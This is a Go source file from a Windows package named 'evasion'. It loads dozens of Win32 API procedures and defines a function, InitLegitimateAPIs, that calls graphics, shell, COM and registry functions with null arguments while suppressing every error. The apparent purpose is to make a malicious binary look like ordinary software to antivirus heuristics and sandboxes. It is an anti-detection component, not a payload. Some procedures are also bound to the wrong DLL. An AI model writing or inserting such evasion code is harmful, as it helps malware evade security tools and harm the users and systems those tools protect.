//go:build windows

package evasion

import (
	"syscall"
)

var (
	gdi32DLL    = syscall.NewLazyDLL("gdi32.dll")
	shell32DLL  = syscall.NewLazyDLL("shell32.dll")
	ole32DLL    = syscall.NewLazyDLL("ole32.dll")
	advapi32DLL = syscall.NewLazyDLL("advapi32.dll")
	user32DLL   = syscall.NewLazyDLL("user32.dll")
	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
	versionDLL  = syscall.NewLazyDLL("version.dll")

	procCreateSolidBrush   = gdi32DLL.NewProc("CreateSolidBrush")
	procDeleteObject       = gdi32DLL.NewProc("DeleteObject")
	procDrawText           = gdi32DLL.NewProc("DrawTextW")
	procGetDC              = gdi32DLL.NewProc("GetDC")
	procReleaseDC          = gdi32DLL.NewProc("ReleaseDC")
	procCreateFont         = gdi32DLL.NewProc("CreateFontW")
	procGetTextExtentPoint = gdi32DLL.NewProc("GetTextExtentPointW")
	procSelectObject       = gdi32DLL.NewProc("SelectObject")
	procSetTextColor       = gdi32DLL.NewProc("SetTextColor")

	procSHGetFolderPath      = shell32DLL.NewProc("SHGetFolderPathW")
	procSHGetKnownFolderPath = shell32DLL.NewProc("SHGetKnownFolderPath")
	procExtractIcon          = shell32DLL.NewProc("ExtractIconW")
	procShellExecute         = shell32DLL.NewProc("ShellExecuteW")

	procCoInitialize     = ole32DLL.NewProc("CoInitialize")
	procCoUninitialize   = ole32DLL.NewProc("CoUninitialize")
	procCoCreateInstance = ole32DLL.NewProc("CoCreateInstance")

	procRegOpenKeyEx        = advapi32DLL.NewProc("RegOpenKeyExW")
	procRegCloseKey         = advapi32DLL.NewProc("RegCloseKey")
	procRegQueryValueEx     = advapi32DLL.NewProc("RegQueryValueExW")
	procCryptAcquireContext = advapi32DLL.NewProc("CryptAcquireContextW")

	procGetDesktopWindow = user32DLL.NewProc("GetDesktopWindow")
	procGetWindowRect    = user32DLL.NewProc("GetWindowRect")
	procShowWindow       = user32DLL.NewProc("ShowWindow")
	procUpdateWindow     = user32DLL.NewProc("UpdateWindow")
	procCreateWindowEx   = user32DLL.NewProc("CreateWindowExW")
	procDestroyWindow    = user32DLL.NewProc("DestroyWindow")

	procGetModuleHandle        = kernel32DLL.NewProc("GetModuleHandleW")
	procGetCommandLine         = kernel32DLL.NewProc("GetCommandLineW")
	procGetCurrentDirectory    = kernel32DLL.NewProc("GetCurrentDirectoryW")
	procSetCurrentDirectory    = kernel32DLL.NewProc("SetCurrentDirectoryW")
	procGetEnvironmentStrings  = kernel32DLL.NewProc("GetEnvironmentStringsW")
	procFreeEnvironmentStrings = kernel32DLL.NewProc("FreeEnvironmentStringsW")

	procGetFileVersionInfoSize = versionDLL.NewProc("GetFileVersionInfoSizeW")
	procGetFileVersionInfo     = versionDLL.NewProc("GetFileVersionInfoW")
)

func InitLegitimateAPIs() {
	defer func() { recover() }()
	procCreateSolidBrush.Call(uintptr(0x00FFFFFF))
	procDeleteObject.Call(uintptr(0))
	procDrawText.Call(uintptr(0), uintptr(0), 0, uintptr(0), 0, 0)
	procGetDC.Call(uintptr(0))
	procReleaseDC.Call(uintptr(0), uintptr(0))
	procCreateFont.Call(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, uintptr(0))

	func() {
		defer func() { recover() }()
		procSHGetFolderPath.Call(uintptr(0), 0, uintptr(0), 0, uintptr(0))
	}()
	func() {
		defer func() { recover() }()
		procSHGetKnownFolderPath.Call(uintptr(0), uintptr(0))
	}()

	procCoInitialize.Call(uintptr(0))
	procCoUninitialize.Call()

	func() {
		defer func() { recover() }()
		procRegOpenKeyEx.Call(uintptr(0), uintptr(0), 0, 0, uintptr(0))
	}()
	func() {
		defer func() { recover() }()
		procRegCloseKey.Call(uintptr(0))
	}()
}
